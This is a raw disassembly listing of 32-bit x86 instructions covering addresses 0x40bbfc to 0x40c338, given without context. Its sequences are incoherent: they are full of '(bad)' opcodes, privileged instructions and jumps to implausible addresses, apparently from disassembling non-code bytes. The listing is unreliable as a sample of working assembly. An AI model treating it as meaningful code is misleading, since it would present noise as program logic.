  40bbfc:	cmp    esi,DWORD PTR [ebx+esi*2-0x73]
  40bc00:	sub    edx,DWORD PTR [ebx+eax*1]
  40bc03:	dec    ebp
  40bc04:	mov    DWORD PTR [ebp-0x74a48ba1],eax
  40bc0a:	ret    0x83
  40bc0d:	clc    
  40bc0e:	mov    esp,DWORD PTR [ebx]
  40bc10:	add    DWORD PTR [ebx],0x1c
  40bc13:	jnp    0x90504792
  40bc19:	pop    ecx
  40bc1a:	add    BYTE PTR [ebx],al
  40bc1c:	xor    DWORD PTR [eax+eax*1-0x73],0xffffff84
  40bc21:	adc    al,0x1
  40bc23:	jge    0x40bc25
  40bc25:	mov    edx,edx
  40bc27:	cld    
  40bc28:	test   BYTE PTR [edi],bh
  40bc2a:	add    edi,edi
  40bc2c:	add    BYTE PTR [esi],al
  40bc2e:	neg    BYTE PTR [ebp-0x7c]
  40bc31:	add    DWORD PTR [eax],eax
  40bc33:	pop    es
  40bc34:	add    BYTE PTR [edi-0x48fff17a],dh
  40bc3a:	add    BYTE PTR [eax+eax*8],cl
  40bc3d:	inc    ebp
  40bc3e:	test   BYTE PTR [ebx+0x300fc00],al
  40bc44:	mov    esi,0xf80039
  40bc49:	fisttp DWORD PTR [edi]
  40bc4b:	mov    bh,0xda
  40bc4d:	push   cs
  40bc4e:	add    BYTE PTR [edi+0x4d340c39],dh
  40bc54:	test   bh,bh
  40bc56:	add    ah,dh
  40bc58:	add    cl,al
  40bc5a:	mov    cl,0x3
  40bc5c:	add    DWORD PTR [ecx+0x7d65ec00],ecx
  40bc62:	add    BYTE PTR [edx-0x36],dh
  40bc65:	mov    ecx,DWORD PTR [esi]
  40bc67:	call   0xef8742e
  40bc6c:	or     al,0xb7
  40bc6e:	dec    ebp
  40bc6f:	or     al,0xf
  40bc71:	inc    ebp
  40bc72:	dec    eax
  40bc73:	add    DWORD PTR [ebx],0x8
  40bc76:	(bad)  
  40bc78:	scas   al,BYTE PTR es:[edi]
  40bc79:	dec    ebp
  40bc7a:	add    BYTE PTR [ecx],bh
  40bc7c:	(bad)  
  40bc7d:	lock adc al,0x82
  40bc80:	mov    edi,edi
  40bc82:	call   0xff9cbc86
  40bc87:	rcl    BYTE PTR [edi-0x15],0x31
  40bc8b:	xor    edi,DWORD PTR [edi+0x5e]
  40bc8e:	adc    ebx,eax
  40bc90:	mov    eax,DWORD PTR gs:[eax]
  40bc93:	mov    edx,esi
  40bc95:	nop
  40bc96:	rol    BYTE PTR [eax],1
  40bc98:	mov    bh,0x83
  40bc9a:	push   cs
  40bc9b:	or     al,0xb7
  40bc9d:	xor    ecx,DWORD PTR [esi+edx*2]
  40bca0:	sti    
  40bca1:	cmp    DWORD PTR [ecx+0xf],ebp
  40bca4:	dec    edx
  40bca5:	test   DWORD PTR [ecx+0x318bec00],ecx
  40bcab:	or     al,0x41
  40bcad:	ret    
  40bcae:	or     DWORD PTR [esi+0x65],edi
  40bcb1:	pop    eax
  40bcb2:	add    BYTE PTR [ebp-0x32],dh
  40bcb5:	xor    ecx,eax
  40bcb7:	inc    eax
  40bcb8:	mov    bh,0x76
  40bcba:	push   cs
  40bcbb:	inc    eax
  40bcbc:	mov    bh,0x3
  40bcbe:	or     al,0x8
  40bcc0:	sti    
  40bcc1:	dec    eax
  40bcc2:	sub    ecx,DWORD PTR [ebx+0x70892479]
  40bcc8:	cld    
  40bcc9:	mov    edi,DWORD PTR [ebp+0x18]
  40bccc:	mov    ecx,DWORD PTR [ebp-0x7b]
  40bccf:	add    esi,DWORD PTR [eax+ecx*1-0x75]
  40bcd3:	jne    0x40bcb9
  40bcd5:	cmp    ebx,DWORD PTR [edi+esi*2]
  40bcd8:	jns    0xff50b957
  40bcde:	pop    ecx
  40bcdf:	jge    0x40bce0
  40bce1:	cmp    eax,edi
  40bce3:	cld    
  40bce4:	inc    ebp
  40bce5:	iret   
  40bce6:	or     BYTE PTR [eax-0x5],bh
  40bce9:	jae    0x40bd68
  40bceb:	(bad)  
  40bced:	xor    al,0xf
  40bcef:	jmp    0x40bd6b
  40bcf1:	mov    ecx,DWORD PTR [edi]
  40bcf3:	lea    ebx,[edx-0x4f]
  40bcf6:	mov    esi,DWORD PTR [ebx]
  40bcf8:	in     al,dx
  40bcf9:	test   BYTE PTR [ebp+0x27],0x83
  40bcfd:	jge    0x40bd07
  40bcff:	add    edi,ebx
  40bd01:	mov    DWORD PTR [ebp-0x8],ecx
  40bd04:	cmp    eax,edi
  40bd06:	hlt    
  40bd07:	adc    ah,BYTE PTR [eax+0xf8b4d7d]
  40bd0d:	jl     0x40bd5f
  40bd0f:	clc    
  40bd10:	(bad)  
  40bd12:	js     0x40bc9f
  40bd14:	push   DWORD PTR [edx-0x10]
  40bd17:	mov    eax,ecx
  40bd19:	clc    
  40bd1a:	add    edi,edi
  40bd1c:	mov    DWORD PTR [eax],edx
  40bd1e:	call   0xfbe125e
  40bd23:	inc    edi
  40bd24:	popa   
  40bd25:	jge    0x40bd26
  40bd27:	cmp    ebx,DWORD PTR [edi-0x4]
  40bd2a:	xor    edi,DWORD PTR [edx-0x3ffd78c0]
  40bd30:	rcr    BYTE PTR [esi-0x37],0xc9
  40bd34:	push   ebp
  40bd35:	or     ah,ch
  40bd37:	push   ebp
  40bd38:	sub    ah,0x1
  40bd3b:	in     al,dx
  40bd3c:	add    BYTE PTR [edx-0x7ac7a14],bh
  40bd42:	fist   DWORD PTR [ebp+0x57]
  40bd45:	(bad)  
  40bd46:	sbb    al,bh
  40bd48:	test   BYTE PTR [ebp+0x4500f800],al
  40bd4e:	inc    ebp
  40bd4f:	mov    edi,DWORD PTR [ebx]
  40bd51:	cld    
  40bd52:	je     0x40bda1
  40bd54:	cmp    DWORD PTR [ebx+0x4d05fc78],ecx
  40bd5a:	ror    BYTE PTR [ebx-0x74740315],0x78
  40bd61:	adc    BYTE PTR [ebp-0x42],al
  40bd64:	mov    ecx,DWORD PTR [eax]
  40bd66:	sbb    al,0x7
  40bd68:	push   eax
  40bd69:	inc    ebp
  40bd6a:	mov    ecx,DWORD PTR [edi-0x7487adec]
  40bd70:	add    edi,esp
  40bd72:	or     BYTE PTR [ebx+0x890155],bl
  40bd78:	cld    
  40bd79:	mov    edi,0x372f7
  40bd7e:	jge    0x40bd4e
  40bd80:	xor    eax,esi
  40bd82:	mov    edi,eax
  40bd84:	hlt    
  40bd85:	iret   
  40bd86:	pop    ebp
  40bd87:	inc    ebp
  40bd88:	jbe    0x40bdc5
  40bd8a:	cmp    ecx,DWORD PTR [edi]
  40bd8c:	adc    al,0x7b
  40bd8e:	push   es
  40bd8f:	add    BYTE PTR [edi+0x2fc7a8b],dh
  40bd95:	dec    ebp
  40bd96:	div    DWORD PTR [ebx]
  40bd98:	sbb    al,0x3
  40bd9a:	mov    edi,DWORD PTR [ebx]
  40bd9c:	test   DWORD PTR [edi],ecx
  40bd9e:	je     0x40be09
  40bda0:	mov    eax,DWORD PTR [eax]
  40bda2:	or     BYTE PTR [ebx-0x76820302],cl
  40bda8:	cmp    eax,DWORD PTR [eax]
  40bdaa:	jbe    0x40bdac
  40bdac:	mov    ebx,esi
  40bdae:	or     al,0xdf
  40bdb0:	jg     0x40bd7d
  40bdb2:	add    eax,DWORD PTR [ecx+edi*1-0x1ff07fe]
  40bdb9:	dec    ebp
  40bdba:	add    ecx,DWORD PTR [ecx-0x257a2b83]
  40bdc0:	je     0x40bda0
  40bdc2:	mov    edi,ebx
  40bdc4:	mov    ebx,DWORD PTR [ebp-0xc]
  40bdc7:	mov    ecx,DWORD PTR [ecx+0x7ddaf4f0]
  40bdcd:	adc    dh,BYTE PTR [edx+0x55]
  40bdd0:	jmp    0x40bd5d
  40bdd2:	xor    edi,esp
  40bdd4:	pop    edi
  40bdd5:	rcr    BYTE PTR [ebx+0x33],cl
  40bdd8:	ret    0x3
  40bddb:	cmp    DWORD PTR [ebx+0x2c17830a],ecx
  40bde1:	push   ebp
  40bde2:	xor    eax,0x89fc9c8b
  40bde7:	sar    ah,cl
  40bde9:	xor    eax,DWORD PTR [ebp+0x3]
  40bdec:	xor    al,0x39
  40bdee:	pushf  
  40bdef:	or     cl,BYTE PTR [ebx+0x4d02fc0f]
  40bdf5:	add    BYTE PTR [ebx+0x4dfcfc8b],cl
  40bdfb:	pop    ebp
  40bdfc:	mov    ecx,DWORD PTR [ebx-0x3fb20f04]
  40be02:	push   ebx
  40be03:	add    ebx,DWORD PTR [ebp-0x75]
  40be06:	push   esi
  40be07:	adc    BYTE PTR [edi+0x4d],dl
  40be0a:	push   ecx
  40be0b:	xor    eax,edi
  40be0d:	mov    eax,esi
  40be0f:	in     al,0xeb
  40be11:	dec    ebp
  40be12:	add    ecx,DWORD PTR [ebx-0x317403b3]
  40be18:	nop
  40be19:	iret   
  40be1a:	add    dh,dl
  40be1c:	push   edi
  40be1d:	dec    ebp
  40be1e:	sahf   
  40be1f:	mov    esi,DWORD PTR [edx]
  40be21:	add    esi,DWORD PTR [ebx]
  40be23:	add    esi,DWORD PTR [ebx]
  40be25:	cmp    eax,DWORD PTR [ebx]
  40be27:	je     0x40be2c
  40be29:	add    ecx,DWORD PTR [ecx+0xb4de808]
  40be2f:	mov    eax,DWORD PTR [esp+edi*8+0x4800ce02]
  40be36:	pop    ebp
  40be37:	mov    ecx,DWORD PTR [ebx-0x217bf3f8]
  40be3d:	sahf   
  40be3e:	fbstp  TBYTE PTR [edx]
  40be40:	(bad)  [ecx+0x45020c84]
  40be46:	add    BYTE PTR [eax],dh
  40be48:	pop    ebp
  40be49:	pushf  
  40be4a:	mov    ecx,DWORD PTR [ebx+0x75001080]
  40be50:	xor    ecx,DWORD PTR [ebx+0x3bd803]
  40be56:	ud0    ecx,DWORD PTR [edi-0x75]
  40be5a:	add    ah,bh
  40be5c:	add    ecx,esi
  40be5e:	or     bh,cl
  40be60:	dec    ebp
  40be61:	inc    ebp
  40be62:	mov    edi,DWORD PTR [ebx]
  40be64:	xor    esi,DWORD PTR [ebp+0x3]
  40be67:	mov    ecx,DWORD PTR [ecx+0x5d75f010]
  40be6d:	mov    edi,DWORD PTR [ebx]
  40be6f:	fdiv   DWORD PTR [eax+eax*1-0x75]
  40be73:	push   eax
  40be75:	or     al,0x5d
  40be77:	inc    ebp
  40be78:	imul   eax,edi,0x14
  40be7b:	loopne 0x40be5b
  40be7d:	sbb    ebx,edi
  40be7f:	jg     0x40be9d
  40be81:	inc    ebp
  40be82:	jne    0x40bea0
  40be84:	mov    ebx,DWORD PTR [eax+esi*8+0x6bfc5d8b]
  40be8b:	(bad)  
  40be8c:	adc    al,0xc7
  40be8e:	fiadd  WORD PTR [ebp-0x21]
  40be91:	jne    0x40beef
  40be93:	mov    edx,DWORD PTR [eax]
  40be95:	clc    
  40be96:	test   BYTE PTR [ebp+0x2],cl
  40be99:	xor    eax,DWORD PTR [eax]
  40be9b:	xor    eax,DWORD PTR [ebp-0x73]
  40be9e:	mov    eax,DWORD PTR [ebx]
  40bea0:	cld    
  40bea1:	jb     0x40bee8
  40bea3:	add    BYTE PTR [ebx+0x45],ch
  40bea6:	adc    al,0x8b
  40bea8:	rcr    eax,0x48
  40beab:	add    BYTE PTR [ebx],al
  40bead:	add    ecx,DWORD PTR [eax]
  40beaf:	pmaxub mm1,mm3
  40beb2:	dec    ebp
  40beb3:	dec    DWORD PTR [ebx+0x5545fc24]
  40beb9:	xor    esi,DWORD PTR [ebx]
  40bebb:	add    eax,DWORD PTR [ebx]
  40bebd:	cmp    esi,DWORD PTR [ebx]
  40bebf:	hlt    
  40bec0:	mov    DWORD PTR [edi],ecx
  40bec2:	fadd   QWORD PTR [ebp+0x8]
  40bec5:	xor    edx,edi
  40bec7:	add    ebx,edi
  40bec9:	cmp    ecx,edx
  40becb:	clts   
  40becd:	jp     0x40bf1c
  40becf:	dec    DWORD PTR [ecx+0x4dfcdc8b]
  40bed5:	(bad)  
  40bed6:	xor    eax,edi
  40bed8:	add    eax,DWORD PTR [ebp+0xc]
  40bedb:	jne    0x40bf22
  40bedd:	mov    ecx,DWORD PTR [ebp+0x724d01f8]
  40bee3:	xor    eax,DWORD PTR [eax]
  40bee5:	lea    eax,[ebp+0x1]
  40bee8:	(bad)  
  40bee9:	jb     0x40bec3
  40beeb:	add    BYTE PTR [ebp+0x45e9f845],al
  40bef1:	add    bh,bh
  40bef3:	add    BYTE PTR [eax*2+0x12018d80],cl
  40befa:	add    bh,al
  40befc:	adc    BYTE PTR [ecx*2+0x30e332d],cl
  40bf03:	pop    ebp
  40bf04:	mov    DWORD PTR [ebx],esi
  40bf06:	hlt    
  40bf07:	add    ecx,eax
  40bf09:	jmp    0x85bf20
  40bf0e:	inc    DWORD PTR [ebp+0xc]
  40bf11:	xor    eax,DWORD PTR [eax+0x890103]
  40bf17:	in     al,dx
  40bf18:	push   eax
  40bf19:	inc    ebp
  40bf1a:	mov    DWORD PTR [ebx],esi
  40bf1c:	hlt    
  40bf1d:	add    eax,DWORD PTR [ebp-0x77]
  40bf20:	mov    WORD PTR [esi+eiz*2],cs
  40bf23:	dec    ebp
  40bf24:	(bad)  
  40bf25:	mov    esp,eax
  40bf27:	fcomp  QWORD PTR [ecx+0x45cff8ce]
  40bf2d:	enter  0x633,0x3
  40bf31:	add    al,0x3b
  40bf33:	mov    esp,esi
  40bf35:	in     al,dx
  40bf36:	and    eax,DWORD PTR [ebp+0x45]
  40bf39:	mov    ecx,DWORD PTR [ebx-0x39ba1f68]
  40bf3f:	mov    ecx,esi
  40bf41:	cld    
  40bf42:	pushf  
  40bf43:	dec    ebp
  40bf44:	sahf   
  40bf45:	xor    esi,DWORD PTR [edx]
  40bf47:	add    ecx,DWORD PTR [ebx-0x7f8befc5]
  40bf4d:	mov    eax,DWORD PTR [ecx]
  40bf4f:	cld    
  40bf50:	add    BYTE PTR [ebp-0x31],cl
  40bf53:	xor    ebp,DWORD PTR [edi+0x50c15103]
  40bf59:	pop    ds
  40bf5a:	mov    eax,ecx
  40bf5c:	cld    
  40bf5d:	sbb    dh,al
  40bf5f:	dec    ebp
  40bf60:	(bad)  
  40bf61:	mov    eax,DWORD PTR [ebp+0x10]
  40bf64:	jne    0x40bee6
  40bf66:	mov    eax,DWORD PTR [ecx]
  40bf68:	fadd   DWORD PTR [eax]
  40bf6a:	(bad)  
  40bf6b:	mov    bh,0xc7
  40bf6d:	push   ecx
  40bf6e:	fdiv   DWORD PTR [ebp-0x7a]
  40bf71:	(bad)  
  40bf72:	dec    DWORD PTR [eax]
  40bf74:	call   FWORD PTR [ecx]
  40bf76:	inc    ebp
  40bf77:	inc    ebp
  40bf78:	xor    eax,DWORD PTR [ebx]
  40bf7a:	add    ecx,DWORD PTR [eax]
  40bf7c:	cmp    ecx,DWORD PTR [ebp-0xc]
  40bf7f:	mov    edx,DWORD PTR [edi]
  40bf81:	fadd   DWORD PTR [ebp+0x0]
  40bf84:	mov    eax,DWORD PTR [ebx-0x39fd18]
  40bf8a:	test   ah,dh
  40bf8c:	sahf   
  40bf8d:	push   ecx
  40bf8e:	xor    cl,BYTE PTR [ecx+0x45e80c89]
  40bf94:	out    dx,eax
  40bf95:	mov    eax,DWORD PTR [eax]
  40bf97:	or     al,0xc7
  40bf99:	(bad)  
  40bf9a:	in     al,dx
  40bf9b:	(bad)  
  40bf9c:	sbb    eax,ecx
  40bf9e:	add    DWORD PTR [ebp+0x45],eax
  40bfa1:	jne    0x40bf32
  40bfa3:	mov    eax,DWORD PTR [eax+ebp*8]
  40bfa6:	mov    eax,esi
  40bfa8:	cld    
  40bfa9:	test   dh,bl
  40bfab:	sahf   
  40bfac:	fbstp  TBYTE PTR [edx]
  40bfae:	ret    0x89
  40bfb1:	call   0x4e3cd041
  40bfb6:	(bad)  
  40bfb7:	xor    eax,edi
  40bfb9:	add    eax,DWORD PTR [ebp+0xf]
  40bfbc:	mov    eax,ecx
  40bfbe:	cld    
  40bfbf:	dec    ebp
  40bfc0:	(bad)  
  40bfc1:	mov    edi,eax
  40bfc3:	cdq    
  40bfc4:	inc    ebp
  40bfc5:	inc    ebp
  40bfc6:	mov    esi,DWORD PTR [ebx]
  40bfc8:	cld    
  40bfc9:	lea    eax,[ebp+0x3]
  40bfcc:	xor    esi,DWORD PTR [edx+0x3]
  40bfcf:	add    BYTE PTR [ebx],bh
  40bfd1:	inc    ebp
  40bfd2:	je     0x40bf5f
  40bfd4:	mov    esp,esp
  40bfd6:	cwde   
  40bfd7:	mov    BYTE PTR [ebp-0x39],0x8b
  40bfdb:	add    al,0xe4
  40bfdd:	(bad)  
  40bfdf:	sub    ecx,DWORD PTR [ecx+0x458b0cff]
  40bfe5:	lock mov eax,DWORD PTR [ebp-0x14]
  40bfe9:	mov    eax,esi
  40bfeb:	aam    0xc7
  40bfed:	jmp    0xd645:0x2972c1
  40bff4:	mov    eax,ebp
  40bff6:	in     al,dx
  40bff7:	inc    esi
  40bff9:	mov    eax,edi
  40bffb:	cld    
  40bffc:	jmp    0x750ffbcf
  40c001:	ror    DWORD PTR [ebx+0x4575ec45],0x8b
  40c008:	mov    edi,eax
  40c00a:	fadd   DWORD PTR [ebx]
  40c00c:	add    BYTE PTR [ebp+0xf],al
  40c00f:	xor    ecx,ecx
  40c011:	add    edi,edi
  40c013:	pop    edi
  40c014:	hlt    
  40c015:	pop    ebx
  40c016:	push   eax
  40c017:	ret    0xeb
  40c01a:	mov    ecx,DWORD PTR [ebx+0x2845830c]
  40c020:	mov    eax,DWORD PTR [ebp+0x10]
  40c023:	xor    eax,0xc7019c89
  40c028:	add    al,bl
  40c02a:	rol    BYTE PTR [ebp+0x4575f850],0xff
  40c031:	mov    DWORD PTR [eax],ecx
  40c033:	or     al,0x45
  40c035:	inc    ebp
  40c036:	mov    edi,DWORD PTR [ecx+0x74d08fc]
  40c03c:	xor    eax,ecx
  40c03e:	add    ebx,DWORD PTR [esi+0x568b323b]
  40c044:	clc    
  40c045:	jne    0x40c058
  40c047:	add    ecx,DWORD PTR [ebp+0x3b]
  40c04a:	xor    ecx,DWORD PTR [edi]
  40c04c:	lea    esp,[ecx]
  40c04e:	add    DWORD PTR [eax],eax
  40c050:	jb     0x40bfdd
  40c052:	add    BYTE PTR [eax],cl
  40c054:	inc    ebp
  40c055:	jne    0x40c042
  40c057:	add    ecx,DWORD PTR [ebx-0x3976f3c4]
  40c05d:	or     al,0xc7
  40c05f:	inc    ebp
  40c060:	scas   eax,DWORD PTR es:[edi]
  40c061:	xor    BYTE PTR [ebx+0x48be49c],cl
  40c067:	in     al,0x8b
  40c069:	jne    0x40c063
  40c06b:	mov    eax,esi
  40c06d:	or     al,0x9c
  40c06f:	icebp  
  40c070:	sahf   
  40c071:	shl    DWORD PTR [edx],0xf2
  40c074:	mov    esi,DWORD PTR [esp+edi*8+0x33934d68]
  40c07b:	lsl    ebp,bx
  40c07e:	cmp    DWORD PTR [eax],eax
  40c080:	cdq    
  40c081:	mov    eax,DWORD PTR [ebp-0xba00f4]
  40c087:	add    edx,DWORD PTR [ebp-0x60]
  40c08a:	mov    eax,DWORD PTR [eax]
  40c08c:	call   0x81490e1c
  40c091:	jge    0x40c030
  40c093:	sub    esi,DWORD PTR [edx]
  40c095:	xor    al,0x33
  40c097:	jge    0x40c082
  40c099:	xor    edi,ebp
  40c09b:	add    edi,edi
  40c09d:	mov    DWORD PTR [ebp-0x24],ecx
  40c0a0:	xor    esi,edi
  40c0a2:	add    eax,DWORD PTR [ebx+edi*1-0x3ff7500]
  40c0a9:	jne    0x40c0b3
  40c0ab:	xor    eax,DWORD PTR [ebp+0x3]
  40c0ae:	jmp    0x40c039
  40c0b0:	mov    edi,eax
  40c0b2:	cld    
  40c0b3:	mov    esi,0x5e85c7f0
  40c0b9:	clc    
  40c0ba:	leave  
  40c0bb:	xchg   edi,eax
  40c0bc:	or     al,0x0
  40c0be:	push   ebp
  40c0bf:	mov    ebp,esp
  40c0c1:	cld    
  40c0c2:	in     al,dx
  40c0c3:	icebp  
  40c0c4:	(bad)  
  40c0c5:	jnp    0x40c0c3
  40c0c7:	add    eax,DWORD PTR [ebp+0x453bf8d1]
  40c0cd:	jae    0x40c103
  40c0cf:	sub    ebx,DWORD PTR [ebp+ecx*4-0x76f38f75]
  40c0d6:	inc    ebp
  40c0d7:	call   0x823d7867
  40c0dc:	push   edi
  40c0dd:	call   DWORD PTR [ecx+0x0]
  40c0e0:	xor    ecx,DWORD PTR [ecx+0x7d72ecba]
  40c0e6:	add    BYTE PTR [ebx+0x3082b8b],cl
  40c0ec:	ret    0xf00f
  40c0ef:	xor    eax,DWORD PTR [esi+ebp*8-0x76ffccff]
  40c0f6:	inc    ebp
  40c0f7:	loopne 0x40c084
  40c0f9:	jne    0x40c103
  40c0fb:	mov    esi,DWORD PTR [eax-0x20]
  40c0fe:	push   edi
  40c0ff:	jge    0x40c176
  40c101:	xor    eax,edi
  40c103:	(bad)  
  40c104:	in     al,0x3e
  40c106:	test   DWORD PTR [edx-0x8],esi
  40c109:	add    BYTE PTR [ebp+0x75],al
  40c10c:	mov    ecx,DWORD PTR [ebx+0x7d7df0fc]
  40c112:	xor    esi,DWORD PTR [ebx]
  40c114:	xor    eax,DWORD PTR [ebx]
  40c116:	add    edi,DWORD PTR [ebx]
  40c118:	cmp    DWORD PTR [ebp-0x39],esi
  40c11b:	mov    edx,DWORD PTR [ebp-0x7b82fe10]
  40c121:	xor    eax,DWORD PTR [eax]
  40c123:	add    eax,DWORD PTR [eax]
  40c125:	cmp    esi,DWORD PTR [ebp+0x75]
  40c128:	mov    ecx,DWORD PTR [ebx+0x7d86e008]
  40c12e:	add    BYTE PTR [ecx],al
  40c130:	add    BYTE PTR [ebx+0x4d8b0275],al
  40c136:	or     al,0x75
  40c138:	ja     0x40c0c5
  40c13a:	mov    esi,esp
  40c13c:	cld    
  40c13d:	pop    ebp
  40c13e:	stc    
  40c13f:	mov    edi,edx
  40c141:	in     al,0x75
  40c143:	jge    0x40c180
  40c145:	mov    ecx,DWORD PTR [edi]
  40c147:	or     al,0xc4
  40c149:	icebp  
  40c14a:	add    BYTE PTR [ebx+ecx*4-0xe6c0394],bh
  40c151:	jae    0x40c145
  40c153:	add    esi,DWORD PTR [ebp-0xc]
  40c156:	push   ebx
  40c157:	jne    0x40c19e
  40c159:	mov    esi,DWORD PTR [edx]
  40c15b:	add    al,0x9c
  40c15d:	icebp  
  40c15e:	jmp    0x9dc255
  40c163:	cmp    esi,DWORD PTR [ebp+0xf]
  40c166:	xor    edx,DWORD PTR [ebp+ecx*4-0x1]
  40c16a:	clc    
  40c16b:	pop    ebx
  40c16c:	repnz inc ebp
  40c16e:	out    dx,eax
  40c16f:	pop    edi
  40c170:	test   DWORD PTR [ebx],0x33fe456d
  40c176:	pop    esp
  40c177:	add    ecx,DWORD PTR [eax]
  40c179:	pop    esi
  40c17a:	jge    0x40c13e
  40c17c:	(bad)  
  40c17e:	xor    ecx,DWORD PTR [ebx+0x540f83e6]
  40c184:	add    BYTE PTR [ebp+0x75],al
  40c187:	xor    eax,0xc7ec9c8b
  40c18c:	xor    ah,bl
  40c18e:	repnz test esi,edi
  40c191:	clc    
  40c192:	mov    bh,0x45
  40c194:	rcl    DWORD PTR [ebx+0xc],0xbe
  40c198:	stc    
  40c199:	or     BYTE PTR [ebp+0x7],bh
  40c19c:	mov    esi,eax
  40c19e:	in     al,dx
  40c19f:	sahf   
  40c1a0:	jne    0x40c1d4
  40c1a2:	mov    eax,DWORD PTR [ebx]
  40c1a4:	or     BYTE PTR [ecx+0x45b4e8f1],cl
  40c1aa:	sahf   
  40c1ab:	xor    esi,DWORD PTR [edx]
  40c1ad:	add    ecx,DWORD PTR [ecx+0x75e0e089]
  40c1b3:	mov    ecx,DWORD PTR [ebx-0xeba13e0]
  40c1b9:	mov    esi,edx
  40c1bb:	lock inc cl
  40c1be:	push   ss
  40c1bf:	inc    ebp
  40c1c0:	jne    0x40c143
  40c1c2:	mov    esi,eax
  40c1c4:	in     al,dx
  40c1c5:	mov    ch,0xf1
  40c1c7:	clc    
  40c1c8:	repnz inc ebp
  40c1ca:	dec    BYTE PTR [ebx-0x3e8a07f8]
  40c1d0:	mov    eax,DWORD PTR [ebp-0x24]
  40c1d3:	cmp    DWORD PTR [esi],0xff85c3f8
  40c1d9:	clc    
  40c1da:	call   0x5dcc6124
  40c1df:	hlt    
  40c1e0:	add    ecx,eax
  40c1e2:	clc    
  40c1e3:	inc    ebp
  40c1e4:	jne    0x40c167
  40c1e6:	mov    esi,esp
  40c1e8:	clc    
  40c1e9:	test   DWORD PTR [ebp-0x8],ebx
  40c1ec:	xor    eax,DWORD PTR [ebp+0x3b]
  40c1ef:	mov    esi,ebx
  40c1f1:	in     al,dx
  40c1f2:	xchg   ebp,eax
  40c1f3:	rol    DWORD PTR [ecx],0x45
  40c1f6:	sbb    BYTE PTR [ecx+0x58bec45],al
  40c1fc:	cld    
  40c1fd:	clc    
  40c1fe:	pop    eax
  40c1ff:	pop    es
  40c200:	xor    eax,DWORD PTR [eax]
  40c202:	add    esp,DWORD PTR [esi-0x77]
  40c205:	inc    ebp
  40c206:	hlt    
  40c207:	mov    ebx,esi
  40c209:	or     BYTE PTR [ebp-0x7b0040],al
  40c20f:	add    ecx,DWORD PTR [ebx-0x14ba2800]
  40c215:	test   DWORD PTR [ebx-0x3e2b03f1],ecx
  40c21b:	add    dl,al
  40c21d:	mov    ecx,ecx
  40c21f:	sbb    BYTE PTR [eax],cl
  40c221:	rcl    BYTE PTR [ebp-0x7c],0xec
  40c225:	add    ebp,esp
  40c227:	add    bh,al
  40c229:	mov    edi,esp
  40c22b:	and    BYTE PTR [ebp+0x4500f842],al
  40c231:	data16 xor al,0xc1
  40c234:	pushf  
  40c235:	or     BYTE PTR [ebx+0x5666fc00],cl
  40c23b:	rcl    DWORD PTR [edi+0x4d],0x51
  40c23f:	xor    ax,WORD PTR [ecx]
  40c242:	mov    ebx,0x37285
  40c247:	add    bl,al
  40c249:	inc    ebp
  40c24a:	inc    ebp
  40c24b:	mov    ecx,DWORD PTR [ebx-0x39ba03f8]
  40c251:	add    eax,ebx
  40c253:	cmp    al,0x45
  40c255:	inc    ebp
  40c256:	push   edi
  40c257:	mov    edi,DWORD PTR [ebp+0x50]
  40c25a:	mov    eax,eax
  40c25c:	lock test BYTE PTR [ebp+0x3],cl
  40c260:	xor    eax,DWORD PTR [eax]
  40c262:	mov    DWORD PTR [ebp-0x10],eax
  40c265:	xor    eax,0x8b358c45
  40c26a:	pushf  
  40c26b:	aam    0x8b
  40c26d:	xabort 0xc3
  40c270:	dec    ebp
  40c271:	inc    ebp
  40c272:	xor    ecx,DWORD PTR [ebx-0x78070377]
  40c278:	inc    ebp
  40c279:	add    ebp,esi
  40c27b:	add    BYTE PTR [eax+ecx*1+0x3f4498b],bl
  40c282:	dec    ebp
  40c283:	mov    esi,DWORD PTR [ebx]
  40c285:	cld    
  40c286:	mov    DWORD PTR [edi+0x4501f4],eax
  40c28c:	xor    DWORD PTR [eax],edx
  40c28e:	pushf  
  40c28f:	dec    ebp
  40c290:	mov    ecx,DWORD PTR [ecx-0x2db2df14]
  40c296:	xor    esi,DWORD PTR [ebx]
  40c298:	mov    DWORD PTR [edi+0x4501ec],eax
  40c29e:	xor    eax,0xb8529f55
  40c2a3:	push   ebp
  40c2a4:	xchg   ebp,eax
  40c2a5:	xor    eax,DWORD PTR [eax]
  40c2a7:	add    ecx,DWORD PTR [ecx+0x45712052]
  40c2ad:	inc    DWORD PTR [ebp-0x20aff0e0]
  40c2b3:	mov    eax,DWORD PTR [eax]
  40c2b5:	in     al,0x8b
  40c2b7:	inc    ecx
  40c2b8:	or     al,0x8b
  40c2ba:	rcl    BYTE PTR [eax-0x7c],0xc8
  40c2be:	add    eax,DWORD PTR [ebp+0x0]
  40c2c1:	push   ecx
  40c2c2:	inc    ebp
  40c2c3:	call   0x4fcc4d
  40c2c8:	leave  
  40c2c9:	push   ebp
  40c2ca:	add    BYTE PTR [ebx+0x459466],cl
  40c2d0:	mov    ecx,0x8b8a89
  40c2d5:	or     al,0x33
  40c2d7:	jo     0x40c292
  40c2d9:	(bad)  
  40c2da:	cmp    ecx,DWORD PTR [eax]
  40c2dc:	add    al,ch
  40c2de:	add    eax,DWORD PTR [edi]
  40c2e0:	mov    eax,DWORD PTR [eax]
  40c2e2:	or     BYTE PTR [ebp+0x39],cl
  40c2e5:	mov    ecx,DWORD PTR [edi]
  40c2e7:	cmp    al,0xa9
  40c2e9:	rol    DWORD PTR [eax],0xb7
  40c2ec:	mov    edx,DWORD PTR [esp+edi*8]
  40c2ef:	dec    esp
  40c2f0:	dec    ebp
  40c2f1:	sbb    BYTE PTR [ebx+0x418b084d],cl
  40c2f7:	cld    
  40c2f8:	mov    DWORD PTR [edi-0x31bff9f4],esi
  40c2fe:	test   ebx,ecx
  40c300:	cmovne ecx,DWORD PTR [edi-0x38f0ffc5]
  40c307:	test   al,0xd4
  40c309:	add    BYTE PTR [ebp+0x45fcf88b],al
  40c30f:	into   
  40c310:	xor    ecx,ebx
  40c312:	add    ecx,DWORD PTR [ebp-0x77]
  40c315:	mov    edx,esp
  40c317:	fadd   QWORD PTR [ebp-0x49]
  40c31a:	mov    eax,DWORD PTR [esi]
  40c31c:	nop
  40c31d:	into   
  40c31e:	add    cl,dl
  40c320:	mov    edx,ebx
  40c322:	mov    edx,DWORD PTR [ebp+0x3c]
  40c325:	invd   
  40c327:	mov    BYTE PTR [ebp+0x0],al
  40c32a:	mov    ecx,DWORD PTR [ebx-0x3dffe774]
  40c330:	mov    ecx,DWORD PTR [ecx+0x3e41889]
  40c336:	push   ebp
  40c337:	push   ebp
  40c338:	cmp    ecx,DWORD PTR [ebx+0x488b3875]
